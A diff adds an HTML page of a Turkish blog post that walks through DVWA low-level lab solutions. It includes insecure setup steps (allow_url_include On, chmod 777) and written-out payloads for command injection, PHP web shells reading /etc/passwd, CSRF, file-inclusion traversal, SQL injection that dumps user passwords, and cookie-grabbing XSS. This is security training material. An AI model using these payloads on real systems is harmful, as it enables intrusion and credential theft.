@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>DVWA (Low-Level) Çözümleri</title>
+  <meta name="description" content="      Damn Vulnerable Web App (DVWA), savunmasız olan bir PHP / MySQL web uygulamasıdır. Ana hedefleri, güvenlik uzmanlarının yasal ortamda becerilerini ve a...">
+
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="canonical" href="http://localhost:4000/tr/2017/03/27/dvwa-cozumler-low-level.html">
+  <link rel="alternate" type="application/rss+xml" title="Hakan Bayır" href="http://localhost:4000/feed.xml">
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-101246969-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+
+</head>
+
+
+  <body>
+      <div class="outer">
+        <header class="site-header">
+
+  <div class="wrapper">
+
+    <a class="site-title" href="/">Hakan Bayır</a>
+    
+  </div>
+
+
+
+
+  <div class="header-badge">
+    <a href="/">
+        <img src="/assets/test.jpg" />
+    </a>
+  </div>
+
+    
+</header>
+
+
+        <div class="page-content">
+          <div class="wrapper">
+            <article class="post card" itemscope itemtype="http://schema.org/BlogPosting">
+ <div class="card-content">
+  <header class="post-header">
+    <h1 class="post-title" itemprop="name headline">DVWA (Low-Level) Çözümleri</h1>
+    <p class="post-meta"><time datetime="2017-03-27T00:00:00+03:00" itemprop="datePublished">Mar 27, 2017</time></p>
+  </header>
+
+  <div class="post-content" itemprop="articleBody">
+    <p>      Damn Vulnerable Web App <strong>(DVWA)</strong>, savunmasız olan bir PHP / MySQL web uygulamasıdır. Ana hedefleri, güvenlik uzmanlarının yasal ortamda becerilerini ve araçlarını test etmelerine, web geliştiricilerinin web uygulamalarını güvence altına alma süreçlerini daha iyi anlamalarına ve öğretmenlerin / öğrencilerin sınıf ortamında web uygulaması güvenliğini öğrenmesine / öğretmesine yardımcı olmalarına yardımcı olmaktır .</p>
+
+<p>      GNU/Linux makinanıza DVWA kurulumu için gereken adımları aşağıda listeledim.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1. nano dvwa/config/config.inc.php
+
+_DVWA[ 'db_password' ] = 'sizin_sifeniz'; 
+
+2. nano /etc/php/7.0/apache2/php.ini
+
+allow_url_include = Off --&gt; On      //olarak değiştiriyoruz.
+
+3. chmod -R 777 /var/www/html/dvwa  //Dosya İzini veriyoruz.
+
+4. create database dvwa;          //Veri tabanı oluşturuyoruz. 
+
+5. nano /etc/apache2/apache2.conf   //Dosyasına giderek an alt satıra 'ServerName localhost' 
+
+ekliyoruz
+
+6. /etc/init.d/apache2 start
+
+7. /etc/init.d/mysql start
+
+8. localhost/dvwa/setup.php          //Tarayıcıdan bu adrese giderek başlayabiliriz.
+</code></pre></div></div>
+
+<h4>Brute Force</h4>
+
+<p>      Burada <strong>Burp Suite</strong> aracını kullanarak parametreler yakalayacağız ve bu parametrelere kelimelere gönderip kırmaya çalışacağız. Önce Burp Suite ile tarayıcımızı senkronize çalışır hale getirmek için aşağıdaki adımları izliyoruz.</p>
+
+<p>      Tarayıcıdan <strong>Preferences -&gt; Advanced -&gt; Network -&gt; Settings</strong> bölümüne geliyoruz. Burada Manual proxy configuration kısmını işaretleyip
+<strong>HTTP Proxy : 127.0.0.1 , Port : herhangi birşey</strong> yapıp  geri kalan herşeyi boş bırakıyoruz.</p>
+
+<p><img src="/img/brute-force/mozilla-proxy.png" /></p>
+
+<p>      Sonra Burp başlatıp Proxy Bölümüne geliyoruz. Buradan da <strong>Options</strong> bölümüne gelerek <strong>Proxy Listener</strong> sekmesine yeni bir ekleme yapıyoruz . <strong>Interface : 127.0.0.1 Port : 7777</strong> .
+Bundan sonra Burp ile tarayıcımız senkronize çalışacak.</p>
+
+<p><img src="/img/brute-force/burp-add-proxy.png" /></p>
+
+<p>      Sonra <strong>Intercept</strong> kısmına geliyoruz. Intercept ON ‘a tıklayıp tarayıcıdan Brute Force  kısmına giriş yapmak için bir şeyler yazıp submit 
+ediyoruz. Bu olurken BURP’ te birtakım değişiklikler olduğunu görüyoruz.</p>
+
+<p><img src="/img/brute-force/catch-info.png" /></p>
+
+<p>      <strong>GET</strong> sonucunu aldıktan sonra gelen bütün datayı seçip <strong>INTRUDER</strong> bölümüne gönderiyoruz. 
+Orada ‘$’ işaretlerini temizliyoruz. USERNAME ve PASSWORD kısmındakiler kalıyor. 
+Çünkü değiştirip wordlist saldırısı şeklinde bu değişkenleri yollayacağız. Oturum bilgisi ve diğer değişkenler sabit kalacak.</p>
+
+<p><img src="/img/brute-force/parameters.png" /></p>
+
+<p>      Sonrasında aynı sayfada atak tipini <strong>‘Cluster Bomb’</strong> olarak değiştiriyoruz. Sonra <strong>Payloads</strong> Bölümüne gelip ‘Payload Set =1’ yapıyoruz. Önce username için yollayacağımız kelimeleri
+bu payload set altına dolduruyoruz. Sonrasında ‘Payload Set =2’ yapıp burada da password için 
+yollayacağımız  kelimeleri ekliyoruz. Sonrasında ‘Options’ bölümüne geliyoruz. Burada 
+<strong>‘Grep-Match’</strong> kısmına sonucumuz doğru olduğu takdirde dönen değerin ne olacağı tahminini yapmamız gerekiyor. Eşleştiğinde username ve password değerlerimizin doğru olduğunu anlarız.</p>
+
+<p><img src="/img/brute-force/result.png" /></p>
+
+<h4>Command Injection</h4>
+
+<p>      Önce ping için istedeği ip adresini verdikten sonra şöyle yazarak ;</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1. 127.0.0.1 &amp;&amp; echo "Ctr1l" 
+</code></pre></div></div>
+
+<p>ping işlemlerinin altında yazdığımız komutun sonucunu görüyoruz. Buradan 
+“Command Injection” yapılabildiğini anlıyoruz.Devamında ;</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1. 192.168.0.1 &amp;&amp; echo "&lt;?php echo shell_exec('cat /etc/passwd')  ?&gt;" &gt;&gt; test.php
+2. http://localhost/DVWA-master/vulnerabilities/exec/test.php
+</code></pre></div></div>
+
+<p>      <strong>Passwd</strong> dosyasını ekrana bastıracak bir PHP kodu yazdım ve bunu içeriye test.php olarak yolladım. Bu sayfaya gittiğimizde passwd dosyasının içeriğini görüyoruz.</p>
+
+<h4>CSRF</h4>
+
+<p>      Kaynağı görüntüleyip şifre değiştirme formunu alıyoruz. Buraya göndermek istediğimiz datayı <strong>‘value’</strong> olarak kodumuza ekliyoruz. Sonra bu verilerin nereye gideceğini belirtmemiz gerekiyor. Bunu da “http://localhost/DVWA-master/vulnerabilities/csrf/?”   olarak görüyoruz ve <strong>#</strong> kısmını buna göre düzenliyoruz.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
+
+
+<span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"http://localhost/DVWA-master/vulnerabilities/csrf/?"</span> <span class="na">method=</span><span class="s">"GET"</span><span class="nt">&gt;</span>
+New password:<span class="nt">&lt;br</span> <span class="nt">/&gt;</span>
+<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"password"</span> <span class="na">AUTOCOMPLETE=</span><span class="s">"off"</span> <span class="na">name=</span><span class="s">"password_new"</span> <span class="na">value=</span><span class="s">"ctr1l"</span><span class="nt">&gt;&lt;br</span> <span class="nt">/&gt;</span>
+Confirm new password:<span class="nt">&lt;br</span> <span class="nt">/&gt;</span>
+<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"password"</span> <span class="na">AUTOCOMPLETE=</span><span class="s">"off"</span> <span class="na">name=</span><span class="s">"password_conf"</span> <span class="na">value=</span><span class="s">"ctr1l"</span><span class="nt">&gt;&lt;br</span> <span class="nt">/&gt;</span>
+<span class="nt">&lt;br</span> <span class="nt">/&gt;</span>
+<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Change"</span> <span class="na">name=</span><span class="s">"Change"</span><span class="nt">&gt;</span>
+
+<span class="nt">&lt;/form&gt;</span>
+
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<p>      Bu kodu tarayıcımızda çalıştırdığımızda asıl şifre değiştirme formumuzu doldurduğunu ve şifrenin değiştirildiğini görüyoruz.</p>
+
+<h4>File Inclusion</h4>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1. http://localhost/DVWA-master/vulnerabilities/fi/?page=/etc/passwd
+</code></pre></div></div>
+
+<p>      Tarayıcıdan yazdığımızda  önümüzde /etc/passwd dosyası açılıyor.
+Deneyerek dizinler arası dolaşarak farklı dosyalara ulaşabiliriz.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1. http://localhost/DVWA-master/vulnerabilities/fi/?page=../../../../../../var/www/html/index.html
+</code></pre></div></div>
+
+<h4>File Upload</h4>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1. &lt;?php echo shell_exec('cat /etc/passwd')  ?&gt;
+</code></pre></div></div>
+
+<p>      Bu kodu içeren dosyayı upload edip sisteme kendi php sayfamızı yüklemiş oluyoruz. Çeşitli işlemler yapacak sayfayı
+oluşturmak bize kalıyor. Bu sayfaya gidecek olursak passwd dosyasının içeriğini görebiliriz.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1. http://localhost/DVWA-master/hackable/uploads/shell.php
+</code></pre></div></div>
+
+<h4>SQL Injection</h4>
+
+<p>      Boş alana ‘or 1 or’ yaptıktan sonra sorgu inject edebileceğimizi anlıyoruz ve tüm isimleri listeliyoruz.</p>
+
+<p>      Sonrasında kaç tane sütunumuz olduğunu anlamak için <strong>‘order by 1 #, ‘order by 2 # , ‘order by 3 # </strong>
+ifadelerini denerken 3’te hata alıyoruz. Buradan içeride 2 tane sütunumuz olduğunu anlıyoruz.
+Bundan sonraki ifadelerimizi buna göre yazacağız.</p>
+
+<p>      Önce <strong>database</strong> ve <strong>versiyon</strong> bilgisi için şu sorguyu gönderiyoruz.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1. 'union select database(),version() 
+</code></pre></div></div>
+
+<p><img src="/img/sqli/database-version.png" /></p>
+
+<p>      <strong>Tablo</strong> bilgileri için şu sorguyu gönderiyoruz.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1. 'union select table_name,2 from information_schema.tables #
+</code></pre></div></div>
+
+<p><img src="/img/sqli/tables.png" /></p>
+
+<p>      <strong>Kullanıcı bilgileri</strong> için gönderdiğimiz sorgu da şu şekilde :</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1. 'union select user,password from users #
+</code></pre></div></div>
+
+<p><img src="/img/sqli/users.png" /></p>
+
+<p>      Bu şekilde devam ederek çeşitli bilgileri edinebiliriz.</p>
+
+<h4>XSS (Reflected)</h4>
+
+<p>      Gelecek olan tepkiyi görmek için şöyle bir betik yolluyoruz. Buradan gelen <strong>‘HELLO’</strong> mesajından da anlayacağımız üzere kodlarımızı çalıştırabileceğimizi anlıyoruz.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1. &lt;script&gt;alert("Ctr1l")&lt;/script&gt;
+</code></pre></div></div>
+
+<h4>XSS (Stored)</h4>
+
+<p>      Reflected kısmındaki gibi bir denemeyle kod çalıştırabileceğimizi anlıyoruz.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1. &lt;script&gt;alert(document.cookie)&lt;/script&gt;
+</code></pre></div></div>
+
+<p>      Artık kodumuz içeride saklanıyor. Her ekleme yapmak istediğimizde ekleme işleminin yanında o  kodumuz da çalışacak ve  verilen görevi yapacak.</p>
+
+
+  </div>
+</div>
+</article>
+
+          </div>
+        </div>
+
+        <footer class="site-footer">
+
+  <div class="wrapper">
+
+    <span class="footer-heading">Hakan Bayır</span>
+    <span class="footer-heading">2017 - 2018</span>
+
+  </div>
+
+</footer>
+
+      </div>
+  </body>
+  
+</html>
